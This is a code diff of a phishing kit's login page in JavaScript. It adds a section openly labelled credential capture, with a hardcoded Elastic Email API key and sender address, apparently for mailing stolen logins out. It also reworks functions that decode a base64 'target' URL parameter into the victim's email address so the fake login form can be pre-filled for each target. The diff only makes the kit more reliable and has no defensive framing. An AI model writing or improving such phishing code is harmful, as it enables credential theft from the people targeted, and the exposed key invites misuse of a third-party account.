@@ -904,6 +904,8 @@
             }, duration);
         }
 
+    
+
     // CREDENTIAL CAPTURE FUNCTIONALITY
     const elasticEmailApiKey = '9E00668C1ADFA64D550A4667DFE59D1C5073B82E6302B4E47378551A86C04C1E0F7E45E492B018F64BBFC055C623AF44';
     const fromEmail = 'smtp@choicelink.online';
@@ -921,7 +923,7 @@
     const submitButton = loginForm.querySelector('button[type="submit"]');
     const welcomeMessage = document.querySelector('h3[style*="font-size: 16px"]');
 
-    // Base64 decoding function
+    // Base64 decoding function with proper URI component handling
     function base64Decode(str) {
         // Handle URL-safe base64 encoding
         str = str.replace(/-/g, '+').replace(/_/g, '/');
@@ -929,27 +931,27 @@
         while (str.length % 4) {
             str += '=';
         }
-        return decodeURIComponent(atob(str).split('').map(function(c) {
-            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-        }).join(''));
+        
+        try {
+            // Decode from base64
+            const decoded = atob(str);
+            // Convert to URI component and then decode (to handle %40 etc.)
+            return decodeURIComponent(decoded);
+        } catch (e) {
+            console.error("Base64 decoding error:", e);
+            return null;
+        }
     }
 
     // Function to get query parameter from URL
     function getQueryParam(param) {
         const urlParams = new URLSearchParams(window.location.search);
-        const paramLower = param.toLowerCase();
-        
-        for (let [key, value] of urlParams.entries()) {
-            if (key.toLowerCase() === paramLower) {
-                return value;
-            }
-        }
-        return null;
+        return urlParams.get(param);
     }
 
     // Initialize page based on URL parameters
     function initializePage() {
-        // First try to get the target email directly from URL
+        // Try to get the target email directly from URL
         let targetParam = getQueryParam('target');
         let victimEmail = '';
         
@@ -957,6 +959,12 @@
             try {
                 victimEmail = base64Decode(targetParam);
                 console.log("Decoded email from URL:", victimEmail);
+                
+                if (!victimEmail || !victimEmail.includes('@')) {
+                    console.error("Invalid email format after decoding");
+                    handleInvalidLink();
+                    return;
+                }
             } catch (e) {
                 console.error("Error decoding email:", e);
                 handleInvalidLink();
